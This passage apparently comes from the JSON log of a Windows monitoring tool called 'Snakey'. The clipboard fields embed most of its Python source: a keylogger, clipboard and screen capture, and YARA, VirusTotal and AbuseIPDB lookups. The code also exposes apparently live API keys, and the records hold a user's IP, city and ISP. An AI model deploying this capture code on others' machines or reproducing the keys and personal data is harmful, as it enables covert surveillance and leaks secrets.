scan_dir in yara_scan_dirs:\r\n            if not os.path.isdir(scan_dir):\r\n                print(f\"[WARNING] YARA scan directory '{scan_dir}' does not exist, skipping.\")\r\n                continue\r\n\r\n            for root, dirs, files in os.walk(scan_dir):\r\n                for file in files:\r\n                    file_path = os.path.join(root, file)\r\n\r\n                    # --- ADD THIS EXTENSION CHECK ---\r\n                    if not file_path.lower().endswith(SCAN_EXTENSIONS):\r\n                        # print(f\"[DEBUG] Skipping non-scanable file type: {file_path}\") # Uncomment for debugging\r\n                        continue\r\n                    # --- END EXTENSION CHECK ---\r\n\r\n                    try:\r\n                        # Add a basic file size check to avoid scanning extremely large files\r\n                        # (e.g., limit to 50MB for most malware samples)\r\n                        if os.path.getsize(file_path) > 50 * 1024 * 1024: # 50 MB\r\n                            # print(f\"[DEBUG] Skipping large file: {file_path}\") # Uncomment for debugging\r\n                            continue\r\n\r\n                        matches = rules.match(filepath=file_path)\r\n                        if matches:\r\n                            findings.append({\"file\": file_path, \"matches\": [str(m) for m in matches]})\r\n                    except yara.Error as ye:\r\n                        if \"too many matches\" in str(ye).lower():\r\n                            print(f\"[WARNING] YARA: Too many matches for a string in rule(s) for file: {file_path}. Rule(s) might be too broad. Error: {ye}\")\r\n                        else:\r\n                            print(f\"[ERROR] YARA scanning error for {file_path}: {ye}\")\r\n                        continue\r\n                    except Exception as e:\r\n                        # Catch other file-related errors (e.g., permission denied, file in use)\r\n                        print(f\"[WARNING] Could not scan file {file_path} due to OS error: {e}\")\r\n                        continue\r\n    except Exception as e:\r\n        findings.append({\"error\": f\"YARA scan initialization failed: {e}\"})\r\n    return findings\r\n\r\ndef collect_full_session():\r\n    session_log = {\r\n        \"timestamp\": datetime.now().isoformat(),\r\n        \"system\": {},\r\n        \"clipboard\": \"\",\r\n        \"keystrokes\": \"\",\r\n        \"screenshot_taken\": False,\r\n        \"alerts\": [],\r\n        \"virustotal\": {},\r\n        \"abuseipdb\": {},\r\n        \"important_dirs\": {},\r\n        \"yara_findings\": []\r\n    }\r\n    try:\r\n        session_log[\"system\"][\"username\"] = getpass.getuser()\r\n        hostname = socket.gethostname()\r\n        session_log[\"system\"][\"hostname\"] = hostname\r\n\r\n        addr_info = socket.getaddrinfo(hostname, None)\r\n        ipv4s = list(set(item[4][0] for item in addr_info if ':' not in item[4][0]))\r\n        ipv6s = list(set(item[4][0] for item in addr_info if ':' in item[4][0]))\r\n        session_log[\"system\"][\"private_ip_v4\"] = ipv4s[0] if ipv4s else \"Not found\"\r\n        session_log[\"system\"][\"ip_v6\"] = ipv6s[0] if ipv6s else \"Not found\"\r\n\r\n        ip_info = requests.get(\"https://ipinfo.io/json\").json()\r\n        public_ip = ip_info.get(\"ip\")\r\n        session_log[\"system\"].update({\r\n            \"public_ip\": public_ip,\r\n            \"country\": ip_info.get(\"country\"),\r\n            \"region\": ip_info.get(\"region\"),\r\n            \"city\": ip_info.get(\"city\"),\r\n            \"isp\": ip_info.get(\"org\", \"Unknown\")\r\n        })\r\n\r\n        if ip_info.get(\"country\") and ip_info[\"country\"] not in known_countries:\r\n            session_log[\"alerts\"].append(f\"Access from untrusted country: {ip_info['country']}\")\r\n\r\n        abuse_info = check_ip_reputation_abuseipdb(public_ip)\r\n        if abuse_info:\r\n            session_log[\"abuseipdb\"] = abuse_info\r\n            if abuse_info.get(\"abuse_score\", 0) > 50:\r\n                session_log[\"alerts\"].append(f\"High abuse score IP ({abuse_info['abuse_score']}): {public_ip}\")\r\n\r\n        session_log[\"system\"][\"processor\"] = platform.processor()\r\n        session_log[\"system\"][\"os\"] = platform.system() + \" \" + platform.version()\r\n        session_log[\"system\"][\"machine\"] = platform.machine()\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"System info error: {e}\")\r\n\r\n    try:\r\n        win32clipboard.OpenClipboard()\r\n        try:\r\n            session_log[\"clipboard\"] = win32clipboard.GetClipboardData()\r\n        except TypeError:\r\n            session_log[\"clipboard\"] = \"Clipboard is empty.\"\r\n        win32clipboard.CloseClipboard()\r\n        session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Clipboard error: {e}\")\r\n\r\n    try:\r\n        screenshot_path = os.path.join(base_path, screenshot_information)\r\n        im = ImageGrab.grab()\r\n        im.save(screenshot_path)\r\n        session_log[\"screenshot_taken\"] = True\r\n        session_log[\"screenshot_hash\"] = hash_file(screenshot_path)\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Screenshot error: {e}\")\r\n\r\n    if session_log[\"clipboard\"].startswith(\"http\"):\r\n        vt_result = vt_lookup_url(session_log[\"clipboard\"])\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"clipboard_url\"] = vt_result\r\n\r\n    if session_log.get(\"screenshot_taken\"):\r\n        vt_result = vt_lookup_file(screenshot_path)\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"screenshot_file\"] = vt_result\r\n\r\n    keys = []\r\n    def on_press(key):\r\n        if hasattr(key, 'char'):\r\n            keys.append(key.char)\r\n        elif key == Key.space:\r\n            keys.append(' ')\r\n\r\n    print(\"[INFO] Keylogger running. Create 'stop_snakey.txt' to terminate.\")\r\n    with Listener(on_press=on_press) as listener:\r\n        start_time = time.time()\r\n        while time.time() - start_time < 10:\r\n            time.sleep(1)\r\n            if check_stop_file():\r\n                print(\"[INFO] Stop file detected. Exiting keylogger.\")\r\n                break\r\n\r\n    session_log[\"keystrokes\"] = ''.join(keys)\r\n    session_log[\"important_dirs\"] = check_important_directories()\r\n    session_log[\"yara_findings\"] = scan_with_yara()\r\n    log_string = json.dumps(session_log, sort_keys=True)\r\n    session_log[\"log_hash\"] = hash_text(log_string)\r\n\r\n    try:\r\n        if os.path.exists(json_log_path):\r\n            with open(json_log_path, \"r\") as f:\r\n                logs = json.load(f)\r\n        else:\r\n            logs = []\r\n\r\n        logs.append(session_log)\r\n        with open(json_log_path, \"w\") as f:\r\n            json.dump(logs, f, indent=4)\r\n\r\n        print(\"[SUCCESS] Log saved to JSON file.\")\r\n\r\n        if os.path.exists(hash_ledger_path):\r\n            with open(hash_ledger_path, \"r\") as f:\r\n                ledger = json.load(f)\r\n        else:\r\n            ledger = []\r\n\r\n        previous_hash = ledger[-1][\"log_hash\"] if ledger else \"0\" * 64\r\n        chained_hash = hash_text(session_log[\"log_hash\"] + previous_hash)\r\n\r\n        ledger.append({\r\n            \"timestamp\": session_log[\"timestamp\"],\r\n            \"log_hash\": session_log[\"log_hash\"],\r\n            \"previous_hash\": previous_hash,\r\n            \"chained_hash\": chained_hash\r\n        })\r\n\r\n        with open(hash_ledger_path, \"w\") as f:\r\n            json.dump(ledger, f, indent=4)\r\n\r\n        print(\"[SUCCESS] Blockchain-style hash ledger updated.\")\r\n\r\n        merkle_root = build_merkle_tree([entry[\"log_hash\"] for entry in ledger])\r\n        with open(merkle_root_path, \"w\") as f:\r\n            f.write(merkle_root)\r\n\r\n        print(\"[SUCCESS] Merkle root saved.\")\r\n    except Exception as e:\r\n        print(f\"[ERROR] Failed to save log or update ledger: {e}\")\r\n\r\n    return session_log\r\n\r\n# === Main Daemon Loop ===\r\nif __name__ == \"__main__\":\r\n    print(\"[INFO] Starting Snakey in daemon mode...\")\r\n\r\n    while True:\r\n        if check_stop_file():\r\n            print(\"[INFO] Snakey terminated by stop file.\")\r\n            break\r\n\r\n        session_log = collect_full_session()\r\n        log_to_wazuh_file(session_log)\r\n        time.sleep(15)\r\n\r\n    stop_file_path = os.path.join(base_path, \"stop_snakey.txt\")\r\n    if os.path.exists(stop_file_path):\r\n        os.remove(stop_file_path)\r\n        print(\"[INFO] Stop file removed.\")", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (811 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "4bff72435cd7455a8ddfaa2e3f10163868ccfc2df0f81d04652c523273584350", "screenshot_hash": "129abb1d105e63ac183fe8ea63c49a2e38273ed3d223da92200b072e7790015a", "_raw_log_hash": "8f8440fbb73ee9d17e31638dc82b7efeaccc98af8bc59d4346fb86c2507b4c9c"}
{"timestamp": "2025-06-20T23:22:16.660686+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "import os\r\nimport time\r\nimport json\r\nimport socket\r\nimport getpass\r\nimport hashlib\r\nimport platform\r\nimport yara\r\nfrom datetime import datetime\r\nfrom requests import get, post # Keep requests here\r\nfrom pynput.keyboard import Key, Listener\r\nfrom PIL import ImageGrab\r\nimport win32clipboard\r\nfrom cryptography.fernet import Fernet\r\nimport requests # Ensure requests is imported early\r\n\r\n# === Configuration ===\r\nbase_path = \"C:/Users/ktmdu/PycharmProjects/Snakey/Cryptography\"\r\nencrypted_path = os.path.join(base_path, \"encrypted/\")\r\nos.makedirs(encrypted_path, exist_ok=True)\r\n\r\njson_log_path = os.path.join(base_path, \"snakey_log.json\")\r\nhash_ledger_path = os.path.join(base_path, \"hash_ledger.json\")\r\nmerkle_root_path = os.path.join(base_path, \"merkle_root.txt\")\r\nwazuh_log_file = os.path.join(base_path, \"wazuh_alerts.log\")\r\n\r\nscreenshot_information = \"screenshot.png\"\r\nkey_path = os.path.join(encrypted_path, \"key.key\")\r\nknown_countries = [\"Spain\"]\r\n\r\n# === VirusTotal Config ===\r\nVT_API_KEY = \"c5f762cd3b75395566d2cce05125d25c40af4ac71ce73801e936080938784b46\" # Your VirusTotal API Key\r\nVT_URL_LOOKUP = \"https://www.virustotal.com/api/v3/urls/\"\r\nVT_FILE_LOOKUP = \"https://www.virustotal.com/api/v3/files/\"\r\nVT_HEADER = {\"x-apikey\": VT_API_KEY}\r\n\r\n# === AbuseIPDB Config ===\r\nABUSE_API_KEY = \"186c285f36f339778ed4ce322cd971b512fb79144c5d4f333c5f4fd0398fa51c5b6db9994eb51e40\" # Your AbuseIPDB API Key\r\n\r\n# YARA Configuration\r\nyara_rules_path = os.path.join(\"C:/Users/ktmdu/PycharmProjects/Snakey/Yara-rules/yara_rules\", \"malware_index.yar\")\r\n\r\n# --- MODIFICATION START ---\r\n# Define the essential directories to scan for malware.\r\n# These are common locations where malware often resides or drops files.\r\n# Avoid scanning entire system drives (like C:/Windows, C:/Program Files)\r\n# as they contain millions of legitimate files that can trigger generic rules.\r\n\r\n# Get common user-specific paths\r\nuser_home = os.path.expanduser(\"~\")\r\nappdata_local = os.environ.get(\"LOCALAPPDATA\")\r\nappdata_roaming = os.environ.get(\"APPDATA\")\r\ntemp_dir = os.environ.get(\"TEMP\") or os.environ.get(\"TMP\") # Gets the primary temp dir\r\n\r\n# List of essential directories to scan.\r\n# We'll use os.path.normpath to ensure consistent path separators.\r\nyara_scan_dirs = [\r\n    os.path.normpath(os.path.join(user_home, \"Desktop\")),\r\n    os.path.normpath(os.path.join(user_home, \"Downloads\")),\r\n    os.path.normpath(os.path.join(user_home, \"Documents\")),\r\n    os.path.normpath(os.path.join(user_home, \"Pictures\")), # Sometimes malware drops here\r\n]\r\n\r\n# Add AppData and Temp directories if they exist\r\nif appdata_local:\r\n    yara_scan_dirs.append(os.path.normpath(os.path.join(appdata_local, \"Temp\"))) # Local AppData Temp\r\n    yara_scan_dirs.append(os.path.normpath(os.path.join(appdata_local))) # General Local AppData\r\nif appdata_roaming:\r\n    yara_scan_dirs.append(os.path.normpath(os.path.join(appdata_roaming))) # General AppData Roaming\r\nif temp_dir:\r\n    yara_scan_dirs.append(os.path.normpath(temp_dir)) # Main system temp dir\r\n\r\n# Add common persistence locations (Windows specific)\r\n# Use os.getenv for environment variables like PROGRAMDATA\r\nprogram_data = os.getenv('PROGRAMDATA') # C:\\ProgramData\r\nif program_data:\r\n    yara_scan_dirs.append(os.path.normpath(program_data))\r\n    # Common Startup folders (malware often uses these for persistence)\r\n    yara_scan_dirs.append(os.path.normpath(os.path.join(appdata_roaming, \"Microsoft\", \"Windows\", \"Start Menu\", \"Programs\", \"Startup\")))\r\n    yara_scan_dirs.append(os.path.normpath(os.path.join(program_data, \"Microsoft\", \"Windows\", \"Start Menu\", \"Programs\", \"Startup\")))\r\n\r\n# Filter out any non-existent directories from the list to avoid errors\r\nyara_scan_dirs = [d for d in yara_scan_dirs if os.path.isdir(d)]\r\n\r\nprint(f\"[INFO] YARA will scan the following directories: {yara_scan_dirs}\")\r\n# --- MODIFICATION END ---\r\n\r\n\r\nif not os.path.exists(key_path):\r\n    print(\"[ERROR] Encryption key not found! Run GenerateKey.py first.\")\r\n    exit(1)\r\n\r\nwith open(key_path, \"rb\") as key_file:\r\n    key = key_file.read()\r\n\r\nfernet = Fernet(key)\r\n\r\n# === Utility Functions ===\r\ndef hash_file(filepath):\r\n    sha256_hash = hashlib.sha256()\r\n    try:\r\n        with open(filepath, \"rb\") as f:\r\n            for byte_block in iter(lambda: f.read(4096), b\"\"):\r\n                sha256_hash.update(byte_block)\r\n        return sha256_hash.hexdigest()\r\n    except Exception as e:\r\n        print(f\"[ERROR] Hashing failed for {filepath}: {e}\")\r\n        return None\r\n\r\ndef hash_text(text):\r\n    return hashlib.sha256(text.encode()).hexdigest()\r\n\r\ndef build_merkle_tree(hashes):\r\n    if not hashes:\r\n        return None\r\n    while len(hashes) > 1:\r\n        if len(hashes) % 2 != 0:\r\n            hashes.append(hashes[-1])\r\n        new_hashes = []\r\n        for i in range(0, len(hashes), 2):\r\n            combined = hashes[i] + hashes[i + 1]\r\n            new_hashes.append(hash_text(combined))\r\n        hashes = new_hashes\r\n    return hashes[0]\r\n\r\ndef vt_lookup_url(url):\r\n    try:\r\n        url_id = hashlib.sha256(url.encode()).hexdigest()\r\n        response = requests.get(VT_URL_LOOKUP + url_id, headers=VT_HEADER)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n    except Exception as e:\r\n        print(f\"[ERROR] VT URL lookup failed: {e}\")\r\n    return {}\r\n\r\ndef vt_lookup_file(file_path):\r\n    try:\r\n        file_hash = hash_file(file_path)\r\n        response = requests.get(VT_FILE_LOOKUP + file_hash, headers=VT_HEADER)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n    except Exception as e:\r\n        print(f\"[ERROR] VT File lookup failed: {e}\")\r\n    return {}\r\n\r\ndef check_ip_reputation_abuseipdb(ip):\r\n    url = \"https://api.abuseipdb.com/api/v2/check\"\r\n    headers = {\r\n        \"Accept\": \"application/json\",\r\n        \"Key\": ABUSE_API_KEY\r\n    }\r\n    params = {\r\n        \"ipAddress\": ip,\r\n        \"maxAgeInDays\": \"90\"\r\n    }\r\n    try:\r\n        response = requests.get(url, headers=headers, params=params)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return {\r\n                \"abuse_score\": data[\"data\"][\"abuseConfidenceScore\"],\r\n                \"total_reports\": data[\"data\"][\"totalReports\"],\r\n                \"country\": data[\"data\"][\"countryCode\"],\r\n                \"isp\": data[\"data\"][\"isp\"],\r\n                \"domain\": data[\"data\"][\"domain\"],\r\n                \"last_reported\": data[\"data\"][\"lastReportedAt\"]\r\n            }\r\n    except Exception as e:\r\n        print(f\"[ERROR] AbuseIPDB lookup failed: {e}\")\r\n    return {}\r\n\r\ndef check_important_directories():\r\n    important_dirs = {\r\n        \"Desktop\": os.path.join(os.path.expanduser(\"~\"), \"Desktop\"),\r\n        \"Documents\": os.path.join(os.path.expanduser(\"~\"), \"Documents\"),\r\n        \"Downloads\": os.path.join(os.path.expanduser(\"~\"), \"Downloads\"),\r\n        \"AppData_Roaming\": os.environ.get(\"APPDATA\", \"\"),\r\n        \"AppData_Local\": os.environ.get(\"LOCALAPPDATA\", \"\"),\r\n        \"Temp\": os.environ.get(\"TEMP\", \"\")\r\n    }\r\n    dir_status = {}\r\n    for name, path in important_dirs.items():\r\n        if os.path.exists(path):\r\n            try:\r\n                # Get the number of files and folders directly inside this directory\r\n                item_count = 0\r\n                for item in os.listdir(path):\r\n                    if os.path.isfile(os.path.join(path, item)) or os.path.isdir(os.path.join(path, item)):\r\n                        item_count += 1\r\n                dir_status[name] = f\"Found ({item_count} items)\"\r\n            except Exception as e:\r\n                dir_status[name] = f\"Error reading contents: {e}\"\r\n        else:\r\n            dir_status[name] = \"Not found\"\r\n    return dir_status\r\n\r\ndef check_stop_file():\r\n    return os.path.exists(os.path.join(base_path, \"stop_snakey.txt\"))\r\n\r\ndef log_to_wazuh_file(data):\r\n    try:\r\n        with open(wazuh_log_file, \"a\") as f:\r\n            f.write(json.dumps(data) + \"\\n\")\r\n        print(\"[INFO] Log written to Wazuh-compatible file.\")\r\n    except Exception as e:\r\n        print(f\"[ERROR] Wazuh log file write failed: {e}\")\r\n\r\ndef scan_with_yara():\r\n    findings = []\r\n    try:\r\n        if not os.path.exists(yara_rules_path):\r\n            print(f\"[ERROR] YARA rules file not found at: {yara_rules_path}\")\r\n            return findings\r\n\r\n        rules = yara.compile(filepath=yara_rules_path)\r\n        print(f\"[INFO] Starting YARA scan of {len(yara_scan_dirs)} essential directories.\")\r\n\r\n        # Define a list of file extensions that YARA can typically scan\r\n        # This includes executables, libraries, script files, and common archive/text formats.\r\n        # Add or remove extensions based on what types of malware you want to detect.\r\n        SCAN_EXTENSIONS = (\r\n            '.exe', '.dll', '.sys', '.ps1', '.vbs', '.js', '.bat', '.cmd', '.scr', '.hta',\r\n            '.jar', '.py', '.pyc', '.bin', '.dat', # Common binary/data files\r\n            '.zip', '.rar', '.7z', '.iso', # Archives (YARA can sometimes scan inside them, or the archive itself)\r\n            '.txt', '.log', '.ini', '.conf', '.json', '.xml', # Text-based config/log files\r\n            # DO NOT include document types like .docx, .pdf, .xlsx, .jpg, .png, .mp3, .mp4\r\n        )\r\n\r\n        for scan_dir in yara_scan_dirs:\r\n            if not os.path.isdir(scan_dir):\r\n                print(f\"[WARNING] YARA scan directory '{scan_dir}' does not exist, skipping.\")\r\n                continue\r\n\r\n            for root, dirs, files in os.walk(scan_dir):\r\n                for file in files:\r\n                    file_path = os.path.join(root, file)\r\n\r\n                    # --- ADD THIS EXTENSION CHECK ---\r\n                    if not file_path.lower().endswith(SCAN_EXTENSIONS):\r\n                        # print(f\"[DEBUG] Skipping non-scanable file type: {file_path}\") # Uncomment for debugging\r\n                        continue\r\n                    # --- END EXTENSION CHECK ---\r\n\r\n                    try:\r\n                        # Add a basic file size check to avoid scanning extremely large files\r\n                        # (e.g., limit to 50MB for most malware samples)\r\n                        if os.path.getsize(file_path) > 50 * 1024 * 1024: # 50 MB\r\n                            # print(f\"[DEBUG] Skipping large file: {file_path}\") # Uncomment for debugging\r\n                            continue\r\n\r\n                        matches = rules.match(filepath=file_path)\r\n                        if matches:\r\n                            findings.append({\"file\": file_path, \"matches\": [str(m) for m in matches]})\r\n                    except yara.Error as ye:\r\n                        if \"too many matches\" in str(ye).lower():\r\n                            print(f\"[WARNING] YARA: Too many matches for a string in rule(s) for file: {file_path}. Rule(s) might be too broad. Error: {ye}\")\r\n                        else:\r\n                            print(f\"[ERROR] YARA scanning error for {file_path}: {ye}\")\r\n                        continue\r\n                    except Exception as e:\r\n                        # Catch other file-related errors (e.g., permission denied, file in use)\r\n                        print(f\"[WARNING] Could not scan file {file_path} due to OS error: {e}\")\r\n                        continue\r\n    except Exception as e:\r\n        findings.append({\"error\": f\"YARA scan initialization failed: {e}\"})\r\n    return findings\r\n\r\ndef collect_full_session():\r\n    session_log = {\r\n        \"timestamp\": datetime.now().isoformat(),\r\n        \"system\": {},\r\n        \"clipboard\": \"\",\r\n        \"keystrokes\": \"\",\r\n        \"screenshot_taken\": False,\r\n        \"alerts\": [],\r\n        \"virustotal\": {},\r\n        \"abuseipdb\": {},\r\n        \"important_dirs\": {},\r\n        \"yara_findings\": []\r\n    }\r\n    try:\r\n        session_log[\"system\"][\"username\"] = getpass.getuser()\r\n        hostname = socket.gethostname()\r\n        session_log[\"system\"][\"hostname\"] = hostname\r\n\r\n        addr_info = socket.getaddrinfo(hostname, None)\r\n        ipv4s = list(set(item[4][0] for item in addr_info if ':' not in item[4][0]))\r\n        ipv6s = list(set(item[4][0] for item in addr_info if ':' in item[4][0]))\r\n        session_log[\"system\"][\"private_ip_v4\"] = ipv4s[0] if ipv4s else \"Not found\"\r\n        session_log[\"system\"][\"ip_v6\"] = ipv6s[0] if ipv6s else \"Not found\"\r\n\r\n        ip_info = requests.get(\"https://ipinfo.io/json\").json()\r\n        public_ip = ip_info.get(\"ip\")\r\n        session_log[\"system\"].update({\r\n            \"public_ip\": public_ip,\r\n            \"country\": ip_info.get(\"country\"),\r\n            \"region\": ip_info.get(\"region\"),\r\n            \"city\": ip_info.get(\"city\"),\r\n            \"isp\": ip_info.get(\"org\", \"Unknown\")\r\n        })\r\n\r\n        if ip_info.get(\"country\") and ip_info[\"country\"] not in known_countries:\r\n            session_log[\"alerts\"].append(f\"Access from untrusted country: {ip_info['country']}\")\r\n\r\n        abuse_info = check_ip_reputation_abuseipdb(public_ip)\r\n        if abuse_info:\r\n            session_log[\"abuseipdb\"] = abuse_info\r\n            if abuse_info.get(\"abuse_score\", 0) > 50:\r\n                session_log[\"alerts\"].append(f\"High abuse score IP ({abuse_info['abuse_score']}): {public_ip}\")\r\n\r\n        session_log[\"system\"][\"processor\"] = platform.processor()\r\n        session_log[\"system\"][\"os\"] = platform.system() + \" \" + platform.version()\r\n        session_log[\"system\"][\"machine\"] = platform.machine()\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"System info error: {e}\")\r\n\r\n    try:\r\n        win32clipboard.OpenClipboard()\r\n        try:\r\n            session_log[\"clipboard\"] = win32clipboard.GetClipboardData()\r\n        except TypeError:\r\n            session_log[\"clipboard\"] = \"Clipboard is empty.\"\r\n        win32clipboard.CloseClipboard()\r\n        session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Clipboard error: {e}\")\r\n\r\n    try:\r\n        screenshot_path = os.path.join(base_path, screenshot_information)\r\n        im = ImageGrab.grab()\r\n        im.save(screenshot_path)\r\n        session_log[\"screenshot_taken\"] = True\r\n        session_log[\"screenshot_hash\"] = hash_file(screenshot_path)\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Screenshot error: {e}\")\r\n\r\n    if session_log[\"clipboard\"].startswith(\"http\"):\r\n        vt_result = vt_lookup_url(session_log[\"clipboard\"])\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"clipboard_url\"] = vt_result\r\n\r\n    if session_log.get(\"screenshot_taken\"):\r\n        vt_result = vt_lookup_file(screenshot_path)\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"screenshot_file\"] = vt_result\r\n\r\n    keys = []\r\n    def on_press(key):\r\n        if hasattr(key, 'char'):\r\n            keys.append(key.char)\r\n        elif key == Key.space:\r\n            keys.append(' ')\r\n\r\n    print(\"[INFO] Keylogger running. Create 'stop_snakey.txt' to terminate.\")\r\n    with Listener(on_press=on_press) as listener:\r\n        start_time = time.time()\r\n        while time.time() - start_time < 10:\r\n            time.sleep(1)\r\n            if check_stop_file():\r\n                print(\"[INFO] Stop file detected. Exiting keylogger.\")\r\n                break\r\n\r\n    session_log[\"keystrokes\"] = ''.join(keys)\r\n    session_log[\"important_dirs\"] = check_important_directories()\r\n    session_log[\"yara_findings\"] = scan_with_yara()\r\n    log_string = json.dumps(session_log, sort_keys=True)\r\n    session_log[\"log_hash\"] = hash_text(log_string)\r\n\r\n    try:\r\n        if os.path.exists(json_log_path):\r\n            with open(json_log_path, \"r\") as f:\r\n                logs = json.load(f)\r\n        else:\r\n            logs = []\r\n\r\n        logs.append(session_log)\r\n        with open(json_log_path, \"w\") as f:\r\n            json.dump(logs, f, indent=4)\r\n\r\n        print(\"[SUCCESS] Log saved to JSON file.\")\r\n\r\n        if os.path.exists(hash_ledger_path):\r\n            with open(hash_ledger_path, \"r\") as f:\r\n                ledger = json.load(f)\r\n        else:\r\n            ledger = []\r\n\r\n        previous_hash = ledger[-1][\"log_hash\"] if ledger else \"0\" * 64\r\n        chained_hash = hash_text(session_log[\"log_hash\"] + previous_hash)\r\n\r\n        ledger.append({\r\n            \"timestamp\": session_log[\"timestamp\"],\r\n            \"log_hash\": session_log[\"log_hash\"],\r\n            \"previous_hash\": previous_hash,\r\n            \"chained_hash\": chained_hash\r\n        })\r\n\r\n        with open(hash_ledger_path, \"w\") as f:\r\n            json.dump(ledger, f, indent=4)\r\n\r\n        print(\"[SUCCESS] Blockchain-style hash ledger updated.\")\r\n\r\n        merkle_root = build_merkle_tree([entry[\"log_hash\"] for entry in ledger])\r\n        with open(merkle_root_path, \"w\") as f:\r\n            f.write(merkle_root)\r\n\r\n        print(\"[SUCCESS] Merkle root saved.\")\r\n    except Exception as e:\r\n        print(f\"[ERROR] Failed to save log or update ledger: {e}\")\r\n\r\n    return session_log\r\n\r\n# === Main Daemon Loop ===\r\nif __name__ == \"__main__\":\r\n    print(\"[INFO] Starting Snakey in daemon mode...\")\r\n\r\n    while True:\r\n        if check_stop_file():\r\n            print(\"[INFO] Snakey terminated by stop file.\")\r\n            break\r\n\r\n        session_log = collect_full_session()\r\n        log_to_wazuh_file(session_log)\r\n        time.sleep(15)\r\n\r\n    stop_file_path = os.path.join(base_path, \"stop_snakey.txt\")\r\n    if os.path.exists(stop_file_path):\r\n        os.remove(stop_file_path)\r\n        print(\"[INFO] Stop file removed.\")", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (811 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "4bff72435cd7455a8ddfaa2e3f10163868ccfc2df0f81d04652c523273584350", "screenshot_hash": "6cc6725790d264f568e80728301daf041e2881882737e0119f9897dbf3c59aac", "_raw_log_hash": "f556d5e1b5d5715cccd77c7bba29657e59817080e381e4ff6282e3b12dd9f935"}
{"timestamp": "2025-06-20T23:26:36.689290+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Performance Testing\nOn an average user system (Intel i5, 8GB RAM), Snakey operated with under\n2% CPU usage and negligible memory consumption. It was verified that the\nlogger does not affect system responsiveness", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (811 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "45e48a9e38e9287b075a023bbf3d395ddcf12d172b88d71909394a581c05ea24", "screenshot_hash": "5e3990950a950ea8f68e2b7e0edc3e2f45ed907b14b446fb4f544df834402d3e", "_raw_log_hash": "e75329ddfae733c6454c4544a6f2b134a7fea294e743be78434faf9415ed348f"}
{"timestamp": "2025-06-20T23:26:54.839051+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Performance Testing\nOn an average user system (Intel i5, 8GB RAM), Snakey operated with under\n2% CPU usage and negligible memory consumption. It was verified that the\nlogger does not affect system responsiveness", "keystrokes": "[BACKSPACE][ctrl_l][ctrl_l][ctrl_l][ctrl_l][ctrl_l][ctrl_l][ctrl_l]\u0013", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (811 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "45e48a9e38e9287b075a023bbf3d395ddcf12d172b88d71909394a581c05ea24", "screenshot_hash": "02f87479170aa183b338aeafe4ebf004382b04775de15db9ef13f46e8538cbae", "_raw_log_hash": "33b0cc4a4d1d2625a2074d963407259e321b9503b9a39cabca9dbbe1efb9b0fd"}
